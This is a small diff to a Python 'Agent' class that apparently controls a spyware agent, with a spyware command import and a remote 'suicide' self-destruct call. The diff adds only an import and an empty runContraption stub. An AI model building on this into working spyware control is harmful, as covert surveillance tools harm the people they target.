@@ -4,6 +4,7 @@ from responce import Responce
 from funCode import FunCode
 from status import Status
 from spywareCmd import SpywareCmd
+from contParams import *
 
 """this class is for controling 1 spy agent"""
 
@@ -98,3 +99,6 @@ class Agent:
             res = conn.recv_responce_struct()
             assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
             return res
+
+    def runContraption(self, params: ContParams):
+        pass
